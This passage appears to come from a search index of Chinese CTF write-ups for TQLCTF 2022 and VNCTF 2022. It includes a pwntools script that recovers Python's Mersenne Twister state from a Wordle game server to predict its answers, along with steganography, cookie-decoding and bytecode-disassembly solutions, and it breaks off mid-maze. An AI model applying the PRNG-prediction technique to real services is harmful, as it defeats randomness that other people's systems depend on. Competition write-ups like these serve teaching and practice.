random \u7684\u7ed3\u679c</p> <p>\u8fdb\u884c\u4e24\u8f6e easy \u96be\u5ea6\uff08\u4f7f\u7528 solver\uff09\u5c31\u53ef\u4ee5\u5f97\u5230\u8fde\u7eed 512 \u4e2a\u4f2a\u968f\u673a\u6570\uff0c\u4f46\u662f\u5b58\u5728\u7206\u7834\u51fa\u9519\u7684\u53ef\u80fd\uff0c\u7b2c\u4e8c\u8f6e\u7684\u540e 400 \u4e2a\u53ef\u4ee5\u7528\u6765\u9a8c\u8bc1 \u5982\u679c\u540e 400 \u4e2a\u5b8c\u5168\u9884\u6d4b\u6b63\u786e\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c insane \u96be\u5ea6\uff0c\u76f4\u63a5\u9884\u6d4b\u968f\u673a\u6570\u8ba1\u7b97\u5f97\u5230\u7b54\u6848</p> \u5b8c\u6574\u4ee3\u7801 <pre><code>import re\nimport sys\nfrom pwn import *\nfrom tqdm import tqdm\nfrom enum import Enum\nfrom collections import Counter\nfrom randcrack import RandCrack\n\nMAX_ATTEMPT = 6\n\nclass LetterVerdict(Enum):\n    GREEN = 1\n    YELLOW = 2\n    GRAY = 3\n\nclass AttemptVerdict(Enum):\n    WON = 1\n    LOST = 2\n    FAILED_ATTEMPT = 3\n    INVALID_TRY = 4\n    INVALID_WORD = 5\n\ndef get_all_wordle_words():\n    with open(\"valid_words.txt\", \"r\") as infile:\n        return [line.strip() for line in infile.readlines()]\n\nclass WordleSolver:\n    def __init__(self):\n        self.__all_possible_words = set(get_all_wordle_words())\n        self.__invalid_letters = set()\n        self.__untried_letters = set()\n        self.__candidate_words = []\n        self.__green_blocks = set()\n        self.__yellow_blocks = set()\n        self.attempt = 0\n        self.game_number = -1\n        self.tries = []\n        self.reset()\n\n    def reset(self):\n        self.__invalid_letters.clear()\n        self.__candidate_words = sorted(list(self.__all_possible_words))\n        self.__yellow_blocks.clear()\n        self.__green_blocks.clear()\n        self.attempt = 0\n        self.__untried_letters = set(chr(ord('a') + i) for i in range(26))\n        self.game_number += 1\n        self.tries.clear()\n\n    def __contains_forbidden_letters(self, word):\n        for ind, c in enumerate(word):\n            if (c, ind) not in self.__green_blocks: # here fix a bug in\n                if c in self.__invalid_letters:     # the original solver\n                    return True\n        return False\n\n    def __get_untried_letter_probability(self, words):\n        counter = Counter()\n        for w in words:\n            for c in w:\n                if c in self.__untried_letters:\n                    counter[c] += 1\n        return counter\n\n    def __get_letter_freq_map(self, words):\n        counter = Counter()\n        for w in words:\n            for c in w:\n                counter[c] += 1\n        return counter\n\n    def __matches_green_constraints(self, word):\n        for letter, index in self.__green_blocks:\n            if word[index] != letter:\n                return False\n        return True\n\n    def __matches_yellow_constraints(self, word):\n        for letter, index in self.__yellow_blocks:\n            if word[index] == letter or letter not in word:\n                return False\n        return True\n\n    def __filter_out_invalid_words(self):\n        new_candidates = []\n        for word in self.__candidate_words:\n            if self.__contains_forbidden_letters(word) or not self.__matches_green_constraints(\n                    word) or not self.__matches_yellow_constraints(word):\n                continue\n            new_candidates.append(word)\n\n        self.__candidate_words = new_candidates\n\n    def __make_educated_guess(self):\n        untried_letters = self.__get_untried_letter_probability(self.__candidate_words)\n        freq_map = self.__get_letter_freq_map(self.__candidate_words)\n        if len(untried_letters) &gt; 1 and self.attempt &lt;= MAX_ATTEMPT - 1:\n            word_with_score = []\n            word_list = self.__all_possible_words\n            for word in word_list:\n                letters = set(word)\n                untried_score = sum(untried_letters[c] if c in untried_letters else 0 for c in letters)\n                freq_score = sum(freq_map[c] for c in letters)\n                word_with_score.append((word, untried_score, freq_score))\n            ranked_words = sorted(word_with_score,\n                                  key=lambda item: (-item[1], -item[2], item[0]))\n            guess = ranked_words[0][0]\n        else:\n            guess = sorted(\n                self.__candidate_words,\n                key=lambda word: (-len(set(word)), -sum(freq_map[c] for c in word), word)\n            )[0]\n        return guess\n\n    def __pick_a_word(self):\n        self.__filter_out_invalid_words()\n        if len(self.__candidate_words) == 0: # for debug\n            res = input(\"&gt;&gt;&gt; \")\n            return res.strip()\n        elif len(self.__candidate_words) == 1:\n            return self.__candidate_words[0]\n        return self.__make_educated_guess()\n\n    def solve(self, wordle):\n        last_guess = \"\"\n        wordle.p.recvuntil(b\"#\")\n        hex_id = wordle.p.recvline().decode(\"utf-8\").strip()\n        while True:\n            self.attempt += 1\n            guess = self.__pick_a_word()\n            if last_guess == guess:  # here fix a bug in the original solver\n                self.__candidate_words.remove(guess)\n                guess = self.__pick_a_word()\n            result, letter_verdicts = wordle.guess(guess)\n            last_guess = guess\n            self.tries.append(guess)\n            if result == AttemptVerdict.WON:\n                return hex_id, guess\n            elif result == AttemptVerdict.LOST:\n                return False\n            elif result == AttemptVerdict.FAILED_ATTEMPT:\n                for chr in guess:\n                    self.__untried_letters.discard(chr)\n                for i in range(len(letter_verdicts)):\n                    letter, verdict = letter_verdicts[i]\n                    if verdict == LetterVerdict.GRAY:\n                        flag = True\n                        for (l, _) in self.__yellow_blocks: # here fix a bug in\n                            if l == letter:                 # the original solver\n                                flag = False\n                                break\n                        if flag:\n                            self.__invalid_letters.add(letter)\n                    elif verdict == LetterVerdict.GREEN:\n                        self.__green_blocks.add((letter, i))\n                        if (letter, i) in self.__yellow_blocks:\n                            self.__yellow_blocks.remove((letter, i))\n                    elif verdict == LetterVerdict.YELLOW:\n                        self.__yellow_blocks.add((letter, i))\n                    else:\n                        exit(1)\n            elif result == AttemptVerdict.INVALID_WORD:\n                self.attempt -= 1\n                self.__candidate_words.remove(guess)\n                self.__all_possible_words.remove(guess)\n\nclass Wordle:\n    def __init__(self, mode):\n        self.p = connect(\"47.106.102.129\", 23370)\n        self.p.sendlineafter(b\"&gt; \", str(mode).encode(\"utf-8\"))\n\n    def restart(self, mode):\n        self.p.sendlineafter(b\"&gt; \", str(mode).encode(\"utf-8\"))\n\n    def guess(self, word):\n        self.p.sendlineafter(b\"&gt; \", word.encode(\"utf-8\"))\n        status = self.p.recvuntil(b\"!\")\n        if status == b\"Correct!\":\n            return AttemptVerdict.WON, None\n        result = self.p.recvline().decode(\"utf-8\")\n        res = re.findall(r\"\\[4(\\d)m\", result)\n        ret = []\n        for i in range(5):\n            c = word[i]\n            if res[i] == \"7\":\n                ret.append((c, LetterVerdict.GRAY))\n            elif res[i] == \"3\":\n                ret.append((c, LetterVerdict.YELLOW))\n            else:\n                ret.append((c, LetterVerdict.GREEN))\n        attempt_verdict = AttemptVerdict.WON\n        for _, verdict in ret:\n            if verdict != LetterVerdict.GREEN:\n                attempt_verdict = AttemptVerdict.FAILED_ATTEMPT\n                break\n        return attempt_verdict, ret\n\ncracker = RandCrack()\nwordle = Wordle(0)\nsolver = WordleSolver()\n\ndef calc_random_id(hex_id, word):\n    valid_words = get_all_wordle_words()\n    length = len(valid_words)\n    index = valid_words.index(word)  # id % len(valid_words)\n    Id = eval(\"0x\"+hex_id)\n    tmp = Id ^ index # id // len(valid_words)\n    return tmp * length + index\n\ndef calc_hex_id_and_word(random_value):\n    valid_words = get_all_wordle_words()\n    length = len(valid_words)\n    word = valid_words[random_value % length]\n    hex_value = (random_value // length) ^ (random_value % length)\n    return hex(hex_value)[2:].zfill(5), word\n\nwith tqdm(total=624, desc=\"Cracking random...\") as pbar:\n    for i in range(512):\n        solver.reset()\n        hex_id, answer = solver.solve(wordle)\n        random_value = calc_random_id(hex_id, answer)\n        cracker.submit(random_value)\n        pbar.update(1)\n    wordle.restart(0)\n    for i in range(112):\n        solver.reset()\n        hex_id, answer = solver.solve(wordle)\n        random_value = calc_random_id(hex_id, answer)\n        cracker.submit(random_value)\n        pbar.update(1)\nwith tqdm(total=400, desc=\"Verifying crack result...\") as pbar:\n    for i in range(400):\n        solver.reset()\n        predict = cracker.predict_randrange(4090 * (2**20))\n        p_hex_id, p_answer = calc_hex_id_and_word(predict)\n        hex_id, answer = solver.solve(wordle)\n        if p_hex_id != hex_id:\n            print(f\"Crack faild:\\n  predict: {p_hex_id}, {p_answer}\\n  challenge: {hex_id}, {answer}\")\n            sys.exit(1)\n        pbar.update(1)\n\nwordle.p.sendlineafter(b\"&gt; \", b\"3\") # insane level\nwith tqdm(total=512, desc=\"Solving insane level...\") as pbar:\n    for i in range(512):\n        wordle.p.recvuntil(b\"#\")\n        hex_id = wordle.p.recvline().decode(\"utf-8\").strip()\n        predict = cracker.predict_randrange(4090 * (2**20))\n        p_hex_id, p_answer = calc_hex_id_and_word(predict)\n        if hex_id != p_hex_id:\n            print(f\"Predict failed:\\n  predic: {p_hex_id}\\n  challenge: {hex_id}\")\n            sys.exit(1)\n        wordle.p.sendlineafter(b\"&gt; \", p_answer.encode(\"utf-8\"))\n        pbar.update(1)\n\nwordle.p.interactive()\n</code></pre>"}, {"location": "writeups/tqlctf2022/#the-ohio-state-university", "title": "the Ohio State University", "text": "<p>\u9898\u76ee\u63d0\u4f9b\u4e86 .osz \u6587\u4ef6\uff0c\u662f osu! \u6e38\u620f\u8c31\u9762\u7684\u538b\u7f29\u6587\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6e38\u620f\u76f4\u63a5\u6253\u5f00\uff0c\u6216\u8005\u89e3\u538b\u83b7\u5f97\u7d20\u6750\u6587\u4ef6 \u5728osu\u5b98\u7f51\u641c\u7d22\u5230\u5bf9\u5e94\u7684\u8c31\u9762\u5e76\u4e0b\u8f7d\uff1ahttps://osu.ppy.sh/beatmapsets/1235288#mania/2568956</p> <p>\u5c06\u4e24\u4efd\u8c31\u9762\u89e3\u538b\uff0c\u6bd4\u8f83\u6587\u4ef6\u4e0d\u540c</p> <p>\u80cc\u666f\u56fe\u7247\u7684 exif \u91cc\u6709\u4e00\u9879\u5c5e\u6027\uff1a<code>pwd: VVelcome!!</code> \u63a8\u6d4b\u56fe\u7247\u4f1a\u6709\u5e26\u5bc6\u7801\u7684\u9690\u85cf\u5185\u5bb9\uff0csteghide \u89e3\u5bc6\u5f97\u5230 flag \u5f00\u5934\uff1a<code>TQLCTF{VVElcOM3</code></p> <p>BASIC \u96be\u5ea6\u8c31\u9762\u6587\u4ef6\u6709\u4e00\u884c\u5dee\u5f02\uff1a<code>WAVPassword: MisoilePunch</code> \u6697\u793a\u4e86 wav \u97f3\u9891\u6587\u4ef6\u4f1a\u6709\u9690\u85cf\u5185\u5bb9\uff0c\u4f7f\u7528 SilentEye \u5373\u53ef\u63d0\u53d6 \u62ff\u5230 flag \u4e2d\u95f4\u90e8\u5206<code>_TO_O$u_i7s_</code></p> <p>\u6700\u540e\u8fd8\u5269\u4e0b VIVID \u96be\u5ea6\u8c31\u9762\uff0c\u6bd4\u5bf9\u53d1\u73b0\u8c31\u9762\u5c3e\u6740\u88ab\u6539\u4e86</p> <p>\u5269\u4e0b\u4e00\u90e8\u5206\u662f flag \u7684\u7ed3\u5c3e\uff0c\u6240\u4ee5\u7ed3\u5c3e\u5e94\u8be5\u662f }\uff0c\u5176\u5bf9\u5e9416\u8fdb\u5236\u503c\u4e3a 7D\uff0c\u4e8c\u8fdb\u5236 0111 1101\uff0c\u53d1\u73b0\u7ed3\u5c3e\u786e\u5b9e\u6709\u7c7b\u4f3c 0111 1101 \u7684 note \u7136\u540e\u8bb0\u5f55\u6240\u6709 note\uff0c\u8f6c\u6362\u4e3a\u5b57\u7b26\u5c31\u53ef\u4ee5\u62ff\u5230\u6700\u540e\u4e00\u90e8\u5206flag\uff1a5HoWtIme}</p> <p>\u62fc\u63a5\u5f97\u5230\u5b8c\u6574flag\uff1aTQLCTF{VVElcOM3_TO_O$u_i7s_5HoWtIme}</p>"}, {"location": "writeups/tqlctf2022/#nanomaze", "title": "Nanomaze", "text": "<p>\u662f nano \u590d\u523b\u7684 revomaze green \u8ff7\u5bab</p> <p>\u4e3b\u8981\u73a9\u6cd5\u5c31\u662f\u6574\u4e2a\u5730\u56fe\u5728\u5de6\u53f3\u65b9\u5411\u4e0a\u662f\u5faa\u73af\u7684\uff08\u5730\u56fe\u5377\u6210\u4e00\u4e2a\u5706\u7b52\uff09 \u6574\u4e2a\u8ff7\u5bab\u5730\u56fe\u5305\u542b\u9ad8\u5ea6\uff0c\u6bcf\u6b21\u53ea\u80fd\u5411\u540c\u9ad8\u5ea6\u8d70\uff0c\u9ad8\u5ea6\u4e0b\u964d\u4e86\u5c31\u4f1a\u6536\u5230 [click] \u63d0\u793a\uff0c\u8fd9\u4e4b\u540e\u4e5f\u5c31\u4e0d\u80fd\u518d\u539f\u8def\u8fd4\u56de\u4e86 \u5e76\u4e14\u6709\u7279\u6b8a\u4f4d\u7f6e\u53ef\u4ee5\u4f7f\u9ad8\u5ea6\u4e0a\u5347\uff08\u7b2c\u4e00\u884c\u67d0\u5904\uff09 \u76ee\u6807\u662f\u5230\u8fbe\u5730\u56fe\u7684\u6700\u4e0b\u9762\u4e00\u5c42\u7684\u67d0\u4e2a\u4f4d\u7f6e</p> <p>\u7531\u4e8e\u5de6\u53f3\u5faa\u73af\uff0c\u6240\u4ee5\u5148\u627e\u5230\u5730\u56fe\u7684\u6a2a\u5411\u5927\u5c0f \u53ef\u4ee5\u53d1\u73b0\u5411\u53f3\u8d70\u4e00\u6bb5\u540e\u4f1a\u8d70\u4e0d\u52a8\uff0c\u800c\u5411\u5de6\u8d70\u53ef\u4ee5\u4e0d\u65ad\u5f97\u5230 click\uff0c\u901a\u8fc7\u4e24\u4e2a click \u4e4b\u95f4\u7684\u5750\u6807\u5dee\u53ef\u4ee5\u5f97\u5230\u5730\u56fe\u7684\u6a2a\u5411\u5927\u5c0f\u7ea6 75 \u6240\u4ee5\u4e4b\u540e\u7684\u6a2a\u5411\u5750\u6807\u5c31\u53ef\u4ee5\u5bf9 75 \u53d6\u6a21</p> <p>\u540c\u65f6\u4e5f\u53ef\u4ee5\u53d1\u73b0\u6bcf\u6b21\u5411\u53f3\u8d70\u5230\u8d70\u4e0d\u52a8\u7684\u8ddd\u79bb\u4e0d\u4e00\u5b9a \u8fd9\u8bf4\u660e\u8d77\u59cb\u4f4d\u7f6e\u5e76\u4e0d\u56fa\u5b9a\uff0c\u6240\u4ee5\u9700\u8981\u5148\u79fb\u52a8\u5230\u4e0d\u80fd\u52a8\uff0c\u518d\u91cd\u7f6e\u5750\u6807\uff0c\u8fd9\u6837\u4f1a\u6e05\u695a\u5f88\u591a</p> <p>\u7136\u540e\u5c31\u662f\u76f2\u7740\u8d70\u8ff7\u5bab\uff0c\u7528\u4e86 pygame \u6765\u7ed8\u5236\u5230\u8fbe\u7684\u70b9\uff0c\u4ee5\u53ca\u53d1\u751f click \u7684\u4f4d\u7f6e</p> \u4ee3\u7801 <pre><code>from pwn import *\n\nimport pygame\nfrom pygame.locals import *\n\np = process([\"python\", \"main.py\"]) # \u672c\u5730\u590d\u73b0\nX, Y = 0, 0\nwidth = 75\n\npygame.init()\nWHITE = (255, 255, 255)\nGREEN = (0, 255, 0)\nRED = (255, 0, 0)\nBLUE = (0, 0, 255)\n\nsize = width, height = 800, 1000\nclock = pygame.time.Clock()\nscreen = pygame.display.set_mode(size)\npygame.display.set_caption(\"nanomaze\")\nscreen.fill(WHITE)\npygame.display.flip()\n\ndef send(direction):\n    res = p.recvuntil(b\"&gt; \")\n    click = False\n    if \"[click]\" in res.decode(\"utf-8\"):\n        click = True\n    p.sendline(direction.encode(\"utf-8\"))\n    return click, p.recvline().decode(\"utf-8\").strip()\n\ndef update_value(direction, value):\n    global X, Y\n    if direction == \"w\":\n        X -= value\n    elif direction == \"a\":\n        Y -= value\n    elif direction == \"s\":\n        X += value\n    else:\n        Y += value\n    if Y &lt; 0:\n        Y += 75\n\ndef move(direction, aim=None):\n    if aim is None:\n        times = 0\n        while times &lt; 20:\n            click, res = send(direction)\n            if click:\n                log.info(f\"click at    ({X}, {Y})\")\n                return\n            if \"Cannot be moved\" in res:\n                times += 1\n            else:\n                update_value(direction, float(res.split()[2]))\n                times = 0\n                # log.info(f\"  {direction} move to: ({X}, {Y})\")\n        log.info(f\"{direction} to bound: ({X}, {Y})\")\n    else:\n        now = int(X) if direction in \"ws\" else int(Y)\n        while abs((int(X) if direction in \"ws\" else int(Y)) - now) != aim:\n            click, res = send(direction)\n            if click:\n                log.info(f\"click at    ({X}, {Y})\")\n                pygame.display.update()\n                pygame.draw.circle(screen, RED, [20 + Y*10, 20 + X*10], 10, 2)\n                pygame.display.update()\n            if \"Cannot be moved\" not in res:\n                update_value(direction, float(res.split()[2]))\n            else:\n                log.info(f\"Can't move to {aim} in {direction}\")\n                break\n        log.info(f\"{direction} move to:  ({X}, {Y})\")\n        return True\n\nmove(\"w\")\nmove(\"d\")\nX, Y = 0, 75 # \u56fa\u5b9a\u8d77\u59cb\u4f4d\u7f6e\n\ndef w(cnt=1): # \u4fbf\u4e8e\u4ea4\u4e92\n    for _ in range(cnt):\n        move(\"w\", 1)\n        pygame.draw.circle(screen, BLUE, [20 + Y*10, 20 + X*10], 5, 5)\n        pygame.display.update()\ndef a(cnt=1):\n    for _ in range(cnt):\n        move(\"a\", 1)\n        pygame.draw.circle(screen, BLUE, [20 + Y*10, 20 + X*10], 5, 5)\n        pygame.display.update()\ndef s(cnt=1):\n    for _ in range(cnt):\n        move(\"s\", 1)\n        pygame.draw.circle(screen, BLUE, [20 + Y*10, 20 + X*10], 5, 5)\n        pygame.display.update()\ndef d(cnt=1):\n    for _ in range(cnt):\n        move(\"d\", 1)\n        pygame.draw.circle(screen, BLUE, [20 + Y*10, 20 + X*10], 5, 5)\n        pygame.display.update()\n\nwhile True:\n    pygame.display.update()\n    pygame.draw.circle(screen, BLUE, [20 + Y*10, 20 + X*10], 5, 5)\n    pygame.display.update()\n    op = input(\"&gt; \")\n    exec(op)\n</code></pre> <p>\u7ed3\u679c\uff1a </p> <p>nano \u7ed9\u7684\u6807\u51c6\u5730\u56fe\uff1a  \u5c31\u662f revomaze \u7684\u5730\u56fe\uff0c\u8fd9\u4e2a\u89c6\u9891\u7684\u6700\u540e\u6709\u5efa\u6a21\u6f14\u793a</p>"}, {"location": "writeups/vnctf2022/", "title": "VNCTF 2022 Writeup", "text": "<p> \u7ea6 1218 \u4e2a\u5b57  230 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u5bd2\u5047\u91cc\u7684\u4e00\u573a\u4e2a\u4eba\u8d5b\uff0c\u968f\u4fbf\u6253\u7740\u73a9\u4e86\u73a9\uff0c\u505a\u4e86\u51e0\u4e2a misc\uff0c\u548c\u50cf misc \u7684 web/rev/crypto\uff0c\u6392\u4e86 35</p> <p>\u6709\u51e0\u9053\u9898\u5dee\u70b9\u5c31\u80fd\u505a\u51fa\u6765\uff0c\u8fd9\u91cc\u4e5f\u90fd\u5199\u4e0b\u6765\u4e86</p> <p>VNCTF 2022 Official WriteUp</p>"}, {"location": "writeups/vnctf2022/#gamev40", "title": "GameV4.0", "text": "<p>web \u7c7b\u578b\u7684\u7b7e\u5230\u9898</p> <p>\u5f00\u59cb\u8fd8\u53bb\u8ba4\u771f\u5730\u73a9\u4e86\u8fd9\u4e2a\u6e38\u620f\uff0c\u7136\u540e\u6253\u5b8c flag \u5173\u4e5f\u6ca1\u6709\u770b\u5230 flag\uff0c\u5c31\u53bb\u7ffb\u4e86\u6e90\u7801 \u53d1\u73b0\u4e86 data.js \u8fd9\u4e2a\u6587\u4ef6\u4fdd\u5b58\u4e86\u6240\u6709\u5173\u5361\u7684\u6570\u636e\uff0c\u7136\u540e\u5728\u6587\u4ef6\u7684\u6700\u672b\u5c3e\u6709\u4e00\u884c <pre><code>\"ZmxhZw==\": \"Vk5DVEYlN0JXZWxjb21lX3RvX1ZOQ1RGMjAyMiU3RA==\"\n</code></pre> base64 \u89e3\u7801\uff0c\u7136\u540e URL \u89e3\u7801\uff0c\u5f97\u5230\uff1aflag: <code>VNCTF{Welcome_to_VNCTF2022}</code></p>"}, {"location": "writeups/vnctf2022/#gocalc0", "title": "gocalc0", "text": "<p>\u770b\u6837\u5b50\u662f\u975e\u9884\u671f\u4e86</p> <p>\u70b9\u8fdb flag \u5728\u8fd9\u91cc\uff0c\u91cc\u9762\u8bf4 flag is in your session\uff0c\u6253\u5f00 cookies \u53d1\u73b0\uff1a <pre><code>session: MTY0NDk4ODEyMnxEdi1CQkFFQ180SUFBUkFCRUFBQVNQLUNBQUVHYzNSeWFXNW5EQVlBQkVaTVFVY0djM1J5YVc1bkRDd0FLbVpzWVdkN01EWXlZamcyWlRNdE1tSTFNaTAwTURFMUxUZzJNall0TjJFNVkyVTVORFV4TldZMGZRPT18sud3sUmK5woUfaXQnzZ_R_eu8wGDMVPjfgXvyKo99os=\n</code></pre> base64 \u89e3\u7801\u540e\u53d1\u73b0\u91cc\u9762\u8fd8\u6709\u4e00\u6bb5 base64\uff0c\u7ee7\u7eed\u89e3\u7801\uff0c\u5c31\u6709 flag \u4e86\uff1a<code>flag{062b86e3-2b52-4015-8626-7a9ce94515f4}</code></p>"}, {"location": "writeups/vnctf2022/#ezmath", "title": "ezmath", "text": "<p>\u4e00\u9053\u6ca1\u4ec0\u4e48\u542b\u91d1\u91cf\u7684 crypto</p> <p>\u9898\u76ee\u95ee\u7b2c x \u4e2a\u6ee1\u8db3 \\((2^n-1)\\equiv 0\\pmod{15}\\) \u7684 n\uff0c\u5e76\u4e14\u5728\u4e00\u5206\u949f\u4e4b\u5185\u56de\u7b54 777 \u6b21 \u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u7684 n \u4e00\u5b9a\u662f 4 \u7684\u500d\u6570\uff0c\u800c\u4e14\u662f\u5145\u8981\u7684\uff0c\u6240\u4ee5\u76f4\u63a5\u8bfb\u5165\u7136\u540e\u4e58 4 \u518d\u56de\u7b54\u5c31\u597d\u4e86</p>"}, {"location": "writeups/vnctf2022/#babymaze", "title": "BabyMaze", "text": "<p>\u4e00\u9053 python \u7684 rev</p> <p>\u76f4\u63a5 uncompyle6 \u53d1\u73b0\u5361\u6b7b\uff0c\u7136\u540e marshal+dis \u8bfb\u53d6\u5b57\u8282\u7801\u53cd\u7f16\u8bd1 <pre><code>import dis\nimport marshal\n\nwith open(\"BabyMaze.pyc\", \"rb\") as f:\n    code = marshal.loads(f.read()[16:])\n\ndis.dis(code)\n</code></pre> \u5f97\u5230\u5f00\u5934\uff1a <pre><code>  1           0 JUMP_ABSOLUTE            4\n        &gt;&gt;    2 JUMP_ABSOLUTE            6\n        &gt;&gt;    4 JUMP_ABSOLUTE            2\n        &gt;&gt;    6 LOAD_CONST               0 (1)\n...\n             66 LOAD_CONST               0 (1)\n             68 BUILD_LIST              31\n             70 LOAD_CONST               0 (1)\n             72 LOAD_CONST               1 (5)\n             74 LOAD_CONST               0 (1)\n...\n            130 LOAD_CONST               0 (1)\n            132 BUILD_LIST              31\n...\n...\n           1862 LOAD_CONST               0 (1)\n           1864 LOAD_CONST               2 (0)\n...\n           1920 LOAD_CONST               3 (7)\n           1922 LOAD_CONST               0 (1)\n           1924 BUILD_LIST              31\n           1926 LOAD_CONST               0 (1)\n...\n           1986 LOAD_CONST               0 (1)\n\n  3        1988 BUILD_LIST              31\n           1990 BUILD_LIST              31\n           1992 STORE_NAME               0 (_map)\n</code></pre> \u7ed3\u5c3e\uff1a <pre><code>Disassembly of &lt;code object main at 0x00000222A2AC4660, file \".\\BabyMaze.py\", line 23&gt;:\n0 LOAD_GLOBAL        0 (print)\n2 LOAD_CONST         1 ('Welcome To VNCTF2022!!!')\n4 CALL_FUNCTION      1\n6 POP_TOP\n\n8 LOAD_GLOBAL        0 (print)\n0 LOAD_CONST         2 ('Hello Mr. X, this time your mission is to get out of this maze this time.(FIND THAT 7!)')\n2 CALL_FUNCTION      1\n4 POP_TOP\n\n6 LOAD_GLOBAL        0 (print)\n8 LOAD_CONST         3 ('you are still doing the mission alone, this tape will self-destruct in five seconds.')\n0 CALL_FUNCTION      1\n2 POP_TOP\n\n4 LOAD_GLOBAL        1 (maze)\n6 CALL_FUNCTION      0\n8 POP_JUMP_IF_FALSE 40\n\n0 LOAD_GLOBAL        0 (print)\n2 LOAD_CONST         4 ('Congratulation! flag: VNCTF{md5(your input)}')\n4 CALL_FUNCTION      1\n6 POP_TOP\n8 JUMP_FORWARD       8 (to 48)\n</code></pre> \u6240\u4ee5\u5927\u6982\u610f\u601d\u5c31\u662f\u6709\u4e00\u4e2a 31*31 \u5217\u8868\u6784\u6210\u7684 _map \u5730\u56fe\uff0c1 \u662f\u5899\uff0c0 \u53ef\u4ee5\u8d70\uff0c5 \u662f\u81ea\u5df1\uff0c\u8981\u5230\u8fbe 7 \u5e76\u4e14\u901a\u8fc7 wasd \u64cd\u7eb5\u65b9\u5411\uff0c\u5230\u8fbe 7 \u7684\u6240\u6709\u8f93\u5165\u518d md5 \u5c31\u662f flag</p> <p>\u6240\u4ee5\u76f4\u63a5\u6b63\u5219\u63d0\u53d6\u5217\u8868\uff0c\u7136\u540e\u6253\u5370\u51fa\u6765\u624b\u52a8\u505a\u4e00\u4e0b\u5c31\u597d <pre><code>import re\n\nwith open(\"maze.pyc\", \"r\") as f:\n    content = f.read()\n\nres = re.findall(\"(?:LOAD_CONST.*?\\((\\d)\\))\", content, re.S)\nprint(res)\nptr = 0\nfor i in range(31):\n    for j in range(31):\n        if res[ptr] == \"1\":\n            print(\"\u2588\", end=\"\")\n        else:\n            print(\" \", end=\"\")\n        ptr += 1\n    print()\n</code></pre></p> \u7ed3\u679c <pre><code>\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588 \u2588                 \u2588         \u2588\n\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\n\u2588 \u2588   \u2588       \u2588   \u2588   \u2588 \u2588   \u2588 \u2588\n\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\n\u2588   \u2588   \u2588             \u2588   \u2588   \u2588\n\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588   \u2588 \u2588   \u2588         \u2588   \u2588   \u2588 \u2588\n\u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588\n\u2588     \u2588 \u2588   \u2588   \u2588 \u2588 \u2588   \u2588 \u2588   \u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\n\u2588       \u2588     \u2588   \u2588 \u2588   \u2588 \u2588   \u2588\n\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\n\u2588       \u2588       \u2588 \u2588   \u2588   \u2588   \u2588\n\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588 \u2588   \u2588 \u2588 \u2588 \u2588 \u2588   \u2588           \u2588\n\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\n\u2588 \u2588 \u2588 \u2588 \u2588 \u2588   \u2588   \u2588 \u2588   \u2588 \u2588   \u2588\n\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\n\u2588   \u2588   \u2588 \u2588     \u2588 \u2588 \u2588 \u2588   \u2588   \u2588\n\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588\n\u2588 \u2588   \u2588 \u2588 \u2588       \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\n\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588\n\u2588 \u2588   \u2588 \u2588 \u2588         \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\n\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\n\u2588   \u2588 \u2588 \u2588     \u2588 \u2588 \u2588   \u2588   \u2588 \u2588 \u2588\n\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\n\u2588     \u2588     \u2588   \u2588       \u2588     \u2588\n\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 